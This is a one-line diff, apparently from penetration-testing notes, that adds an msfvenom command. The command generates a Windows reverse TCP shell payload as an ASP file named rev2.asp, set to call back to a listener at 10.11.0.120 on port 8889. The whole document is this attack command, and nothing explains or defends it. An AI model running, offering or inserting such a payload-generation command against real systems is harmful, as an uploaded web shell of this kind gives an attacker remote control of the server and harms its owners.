@@ -1,0 +1,1 @@
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.120 LPORT=8889 -f asp >rev2.asp
